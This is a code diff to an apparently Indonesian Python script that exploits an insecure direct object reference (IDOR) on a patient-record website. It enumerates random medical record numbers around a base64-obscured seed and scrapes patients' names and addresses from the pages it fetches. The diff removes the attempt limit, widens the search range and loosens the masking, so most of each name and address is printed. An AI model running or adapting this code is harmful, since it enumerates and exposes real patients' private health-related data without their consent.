@@ -188,12 +188,12 @@ def parameter_discovery_audit():
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
                     found_valid = False
-                    max_attempts = 999 
-                    
-                    for attempt in range(1, max_attempts + 1):
+                    attempt = 0
+                    while not found_valid:
+                        attempt += 1
                         # Mencari secara acak dalam radius 50 dari No RM acuan Opsi 2 (502013)
                         acuan_rm = int(_decode("NTAyMDEz"))
-                        test_id = str(acuan_rm + random.randint(-50, 50)).zfill(len(original_id))
+                        test_id = str(acuan_rm + random.randint(-500, 500)).zfill(len(original_id))
                         test_url = base_url.replace(original_id, test_id)
                         
                         # Heartbeat pencarian
@@ -203,45 +203,31 @@ def parameter_discovery_audit():
                         test_soup = BeautifulSoup(test_res.text, 'html.parser')
                         
                         # Inisialisasi Data
-                        name, dob, address, nik, phone = "Unknown", "Tidak Ditemukan", "Tidak Ditemukan", "Tidak Ditemukan", "Tidak Ditemukan"
+                        name, address = "Unknown", "Tidak Ditemukan"
                         
                         # Ekstraksi Data (Sinkronisasi dengan Logika Opsi 2)
-                        # Mencari Nama dengan class spesifik
                         n_tag = test_soup.find('p', class_='sale-price text-success') or test_soup.find('p', class_='sale-price')
                         if n_tag:
                             name = n_tag.get_text(strip=True).replace("Nama Pasien :", "").strip()
                             details = test_soup.find_all('p', class_='detail')
                             for p in details:
                                 text = p.get_text(strip=True)
-                                if "Tgl. Lahir" in text: dob = text.split(":")[-1].strip()
-                                elif "Alamat" in text: address = text.split(":")[-1].strip()
-                                elif "NIK" in text: nik = text.split(":")[-1].strip()
-                                elif "No. Telp" in text: phone = text.split(":")[-1].strip()
+                                if "Alamat" in text: address = text.split(":")[-1].strip()
                         
-                        # Validasi: Berhenti jika menemukan data pasien yang valid
-                        if name != "Unknown" and name != "":
+                        # Validasi: Berhenti HANYA jika Nama dan Alamat ditemukan
+                        if name != "Unknown" and address != "Tidak Ditemukan":
                             found_valid = True
-                            result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
                             
-                            # Masking 3 depan ... 3 belakang
-                            m_name = f"{name[:3].upper()}...{name[-3:].upper()}" if len(name) > 6 else name.upper()
-                            m_dob  = f"{dob[:3]}...{dob[-3:]}" if len(dob) > 6 else dob
-                            m_addr = f"{address[:3].upper()}...{address[-3:].upper()}" if len(address) > 6 else address.upper()
-                            m_nik  = f"{nik[:3]}...{nik[-3:]}" if len(nik) > 6 else nik
-                            m_phone = f"{phone[:3]}...{phone[-3:]}" if len(phone) > 6 else phone
+                            # Masking 2 depan dan 2 belakang (Sesuai Request)
+                            # Contoh: SUDARNI -> **DAR**
+                            m_name = f"**{name[2:-2]}**" if len(name) > 4 else "****"
+                            m_addr = f"**{address[2:-2]}**" if len(address) > 4 else "****"
 
                             print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
-                            print(f" [!] No. RM      : {result_mask}")
                             print(f" [!] Nama        : {m_name}")
-                            print(f" [!] Tgl Lahir   : {m_dob}")
                             print(f" [!] Alamat      : {m_addr}")
-                            print(f" [!] NIK         : {m_nik}")
-                            print(f" [!] No. Telp    : {m_phone}")
                             print(f" [!] Status      : \033[91mIDOR Confirmed\033[0m")
                             break
-                    
-                    if not found_valid:
-                        print(f"\n[\033[93m!\033[0m] Discovery Failed: No valid records found in range after {max_attempts} attempts.")
                     
                     if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                         break
